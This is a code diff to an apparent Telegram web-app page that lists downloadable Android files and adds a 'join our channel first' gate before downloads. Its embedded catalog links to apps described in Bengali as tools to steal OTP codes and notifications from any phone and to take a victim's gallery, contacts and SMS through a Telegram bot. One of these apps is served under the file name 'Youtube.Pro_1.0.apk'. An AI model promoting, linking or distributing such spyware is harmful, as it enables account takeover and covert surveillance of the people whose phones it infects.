@@ -142,6 +142,12 @@ body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:1
 .refbox{font-family:var(--mono);font-size:12px;background:var(--bg);border:1px dashed var(--green);border-radius:10px;
   padding:10px;margin-top:8px;word-break:break-all;color:var(--green)}
 .modal{position:fixed;inset:0;z-index:70;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);padding:20px}
+#joinModal{position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;padding:20px}
+.jm-box{background:var(--surface);border:1px solid var(--green-d);border-radius:16px;padding:28px 22px;text-align:center;max-width:340px}
+.jm-box h3{color:var(--green);margin:10px 0}
+.jm-box p{color:var(--muted);font-size:14px;line-height:1.6}
+.jm-join{display:block;background:var(--green);color:#04120a;font-weight:700;border-radius:12px;padding:12px;margin:14px 0 8px;text-decoration:none}
+.jm-ok{display:block;width:100%;background:transparent;color:var(--green);border:1px solid var(--green-d);border-radius:12px;padding:12px;font-weight:700;cursor:pointer}
 .modal.hide{display:none}
 .modal .box{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:24px;max-width:400px;width:100%;text-align:center}
 .modal h3{font-size:19px;margin-bottom:12px}
@@ -218,6 +224,7 @@ body{background:var(--bg);color:var(--text);font-family:var(--sans);min-height:1
 </div></div><script>
 
 
+
 const API = 'https://app.rashd.cc.cd';
 const APPS_FALLBACK = [{"id": "local_1792244080", "label": "Rashd", "desc": "এরা কেউ ডাউনলোড করবেন না", "logo": "https://app.rashd.cc.cd/files/logos/1792244079.jpg", "url": "https://app.rashd.cc.cd/files/1792244036_bot.py", "dl": 2, "size_h": "4.1 KB", "file": "1792244036_bot.py"}, {"id": "gh_1792244916_0", "label": "AI.Website.Builder.Publish_3.0.apks", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_0.png", "url": "https://app.rashd.cc.cd/files/gh_AI.Website.Builder.Publish_3.0.apks", "dl": 35, "size_h": "25.3 MB", "file": "gh_AI.Website.Builder.Publish_3.0.apks"}, {"id": "gh_1792244916_1", "label": "Apktool.M_2.4.0-260718.apk", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/web_apktoolm.png", "url": "https://app.rashd.cc.cd/files/gh_Apktool.M_2.4.0-260718.apk", "dl": 84, "size_h": "15.7 MB", "file": "gh_Apktool.M_2.4.0-260718.apk"}, {"id": "gh_1792244916_2", "label": "CapCut_15.5.0.apk", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/web_capcut.jpg", "url": "https://app.rashd.cc.cd/files/gh_CapCut_15.5.0.apk", "dl": 90, "size_h": "258.0 MB", "file": "gh_CapCut_15.5.0.apk"}, {"id": "gh_1792244916_3", "label": "Dev.Tools.Pro_6.9.1-gp.apk", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_3.png", "url": "https://app.rashd.cc.cd/files/gh_Dev.Tools.Pro_6.9.1-gp.apk", "dl": 54, "size_h": "4.1 MB", "file": "gh_Dev.Tools.Pro_6.9.1-gp.apk"}, {"id": "gh_1792244916_4", "label": "EXPERT.CYBER.SECURITY.ZONE_1.0.0.apk", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_4.png", "url": "https://app.rashd.cc.cd/files/gh_EXPERT.CYBER.SECURITY.ZONE_1.0.0.apk", "dl": 128, "size_h": "4.9 MB", "file": "gh_EXPERT.CYBER.SECURITY.ZONE_1.0.0.apk"}, {"id": "gh_1792244916_5", "label": "MT.Manager_2.26.7.apk", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/web_mtmanager.png", "url": "https://app.rashd.cc.cd/files/gh_MT.Manager_2.26.7.apk", "dl": 57, "size_h": "29.7 MB", "file": "gh_MT.Manager_2.26.7.apk"}, {"id": "gh_1792244916_6", "label": "RS.CYBER.ZONE._2.0.0.apk", "desc": "এটা আপনার অনেক কাজে আসবে এটা দিয়ে আপনি যে কোনো রিপোর্ট করতে পারবেন পাশাপাশি এর ভিতর থেকে লিংক কফি করতে পারবে অনেক রিপোর্ট আছে এই খানে ব্রো", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_6.png", "url": "https://app.rashd.cc.cd/files/gh_RS.CYBER.ZONE._2.0.0.apk", "dl": 34, "size_h": "5.3 MB", "file": "gh_RS.CYBER.ZONE._2.0.0.apk"}, {"id": "gh_1792244916_7", "label": "Rashd sms hack apk V1", "desc": "এটা যেকোনো মোবাইল থেকে ওটিপি বা নোটিফিকেশন হ্যাক করতে পারবেন খারাপ খাজে ব্যবহার করবেন না করলে তার জন্য রাশেদ দায়ী থাকবে না", "logo": "https://i.ibb.co/WWgk6KGw/file-000000009cc882088be63d5844493242.png", "url": "https://app.rashd.cc.cd/files/gh_SMS-Forward.V1._.rashd_1.0-rashd.apk", "dl": 136, "size_h": "6.5 MB", "file": "gh_SMS-Forward.V1._.rashd_1.0-rashd.apk"}, {"id": "gh_1792244916_8", "label": "Tech VPN Pro", "desc": "Tech VPN Pro সব কিছু আর আনলিমিটেড", "logo": "https://i.ibb.co/Y46DVkcd/file-0000000099348208a73cd62f7a15844f.png", "url": "https://app.rashd.cc.cd/files/gh_Tech.VPN.Pro_4.4.5.apk", "dl": 33, "size_h": "31.4 MB", "file": "gh_Tech.VPN.Pro_4.4.5.apk"}, {"id": "gh_1792244916_9", "label": "Telegram.Bot.Free.Hosting_1.0.9.apks", "desc": "এটা দিয়ে টেলিগ্রাম বোর্ড হোস্ট করতে পারবেন ২৪ ঘন্টার ভিতরে দুইটা এড দেখে", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_9.png", "url": "https://app.rashd.cc.cd/files/gh_Telegram.Bot.Free.Hosting_1.0.9.apks", "dl": 109, "size_h": "13.1 MB", "file": "gh_Telegram.Bot.Free.Hosting_1.0.9.apks"}, {"id": "gh_1792244916_10", "label": "Termux_0.119.0-beta.2.apk", "desc": "এটা হলো termux এটা দিন অনেক কিছু করতে পারবেন টেলিগ্রাম বট চালানো ওয়েবসাইট চালানো ক্যামের হ্যাক করা মানে বলতে গেলে এটা দিয়ে অনেক কিছু হ্যাক করতে পারবেন কিন্তু এটা লিগাল কাজে ব্যবহার করবে সবসময়", "logo": "https://app.rashd.cc.cd/files/logos/web_termux.png", "url": "https://app.rashd.cc.cd/files/gh_Termux_0.119.0-beta.2.apk", "dl": 168, "size_h": "109.6 MB", "file": "gh_Termux_0.119.0-beta.2.apk"}, {"id": "gh_1792244916_11", "label": "Rashd sms hack apk V2", "desc": "এটা যেকোনো মোবাইল থেকে ওটিপি বা নোটিফিকেশন হ্যাক করতে পারবেন খারাপ খাজে ব্যবহার করবেন না করলে তার জন্য রাশেদ দায়ী থাকবে না", "logo": "https://i.ibb.co/WWgk6KGw/file-000000009cc882088be63d5844493242.png", "url": "https://app.rashd.cc.cd/files/gh_V4Zteem_1.0_modified.apk", "dl": 388, "size_h": "2.8 MB", "file": "gh_V4Zteem_1.0_modified.apk"}, {"id": "gh_1792244916_12", "label": "Live TV apk", "desc": "এটা দিয়ে যে কোন দেশের লাইভ দেখতে পারবেন ঘরে বসে", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_12.png", "url": "https://app.rashd.cc.cd/files/gh_V4Ztv_1.0.apk", "dl": 77, "size_h": "14.1 MB", "file": "gh_V4Ztv_1.0.apk"}, {"id": "gh_1792244916_13", "label": "YTX_5.8.80.438.apk", "desc": "", "logo": "https://app.rashd.cc.cd/files/logos/icon_gh_1792244916_13.png", "url": "https://app.rashd.cc.cd/files/gh_YTX_5.8.80.438.apk", "dl": 43, "size_h": "21.0 MB", "file": "gh_YTX_5.8.80.438.apk"}, {"id": "gh_1792244916_14", "label": "RASHD gallery hack apk", "desc": "এটা দিয়ে টেলিগ্রাম বটের মাধ্যমে যে কারো গ্যালারির হ্যাক করে নিতে পারবেন তার কন্টাক্ট লিস্ট তার এসএমএস লিস্ট ১০ মিনিটের ভিতর", "logo": "https://i.ibb.co/fz0DX1sF/file-0000000078708208b677e0b3bb5b5f79.png", "url": "https://app.rashd.cc.cd/files/gh_Youtube.Pro_1.0.apk", "dl": 17, "size_h": "48.9 KB", "file": "gh_Youtube.Pro_1.0.apk"}, {"id": "gh_1792244916_15", "label": "ai.text.zip", "desc": "", "logo": "", "url": "https://app.rashd.cc.cd/files/gh_ai.text.zip", "dl": 8, "size_h": "94.9 KB", "file": "gh_ai.text.zip"}, {"id": "gh_1792244916_16", "label": "html.zip", "desc": "", "logo": "", "url": "https://app.rashd.cc.cd/files/gh_html.zip", "dl": 128, "size_h": "10.7 KB", "file": "gh_html.zip"}, {"id": "gh_1792244916_17", "label": "rashd.zip", "desc": "", "logo": "", "url": "https://app.rashd.cc.cd/files/gh_rashd.zip", "dl": 67, "size_h": "5.2 KB", "file": "gh_rashd.zip"}];
 let APPS = APPS_FALLBACK;
@@ -244,6 +251,20 @@ async function checkServer(){
 }
 
 
+
+function joinModal(){
+  if(document.getElementById('joinModal')) return;
+  const d=document.createElement('div');
+  d.id='joinModal';
+  d.innerHTML=`<div class="jm-box">
+    <div style="font-size:44px">🔒</div>
+    <h3>আগে চ্যানেলে জয়েন করো!</h3>
+    <p>📢 @rashdteem চ্যানেলে জয়েন না করলে<br>ডাউনলোড কাজ করবে না</p>
+    <a class="jm-join" href="https://t.me/rashdteem">📢 চ্যানেলে জয়েন করো</a>
+    <button class="jm-ok" onclick="document.getElementById('joinModal').remove();location.reload()">✅ জয়েন করেছি</button>
+  </div>`;
+  document.body.appendChild(d);
+}
 function render(){ renderHome(); }
 let FILT='ALL';
 function extOf(a){ const f=(a.file||'').toLowerCase(); if(f.endsWith('.apks')) return 'APKS'; if(f.endsWith('.apk')) return 'APK'; if(f.endsWith('.zip')) return 'ZIP'; return 'OTHER'; }
@@ -335,6 +356,14 @@ async function loadYou(){
   }
   try{
     const r=await (await fetch(API+'/api/me',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({initData})})).json();
+    if(!r.ok && r.reason==='nojoin'){
+      box.innerHTML=`<div class="youcard"><div style="font-size:40px">🔒</div>
+        <h3>আগে চ্যানেলে জয়েন করো!</h3>
+        <p>📢 @rashdteem চ্যানেলে জয়েন না করলে কিছুই কাজ করবে না</p>
+        <button class="d-install btn-dl" style="margin:0" onclick="location.href='https://t.me/rashdteem'">📢 চ্যানেলে জয়েন করো</button>
+        <button class="dlmini" style="margin-top:10px" onclick="location.reload()">✅ জয়েন করেছি</button></div>`;
+      return;
+    }
     if(!r.ok) throw 0;
     const link='https://t.me/rashd12bot?start=ref_'+r.id;
     box.innerHTML=`<div class="youcard"><div class="youav">${esc((r.name||'V')[0].toUpperCase())}</div>
@@ -379,6 +408,7 @@ async function dlApp(idx, btn){
       }
       loadYou();
     } else if(s.reason==='nocredit'){ alert('🔒 ক্রেডিট শেষ! রেফার করো — ১ রেফার = ১ ডাউনলোড'); }
+    else if(s.reason==='nojoin'){ joinModal(); }
     else alert('⚠ সমস্যা হয়েছে, আবার চেষ্টা করো।');
   }catch(e){ if(poll) clearInterval(poll); alert('⚠ নেটওয়ার্ক সমস্যা!'); }
   if(btn){ btn.disabled=false; btn.textContent=oldTxt; }
@@ -422,6 +452,7 @@ async function dlApp(idx){
 }
 try{ if(window.Telegram&&Telegram.WebApp){ Telegram.WebApp.ready(); Telegram.WebApp.expand(); } }catch(e){}
 renderHome(); loadCatalog(); checkServer(); setInterval(checkServer,60000);
+
 
 
 </script>
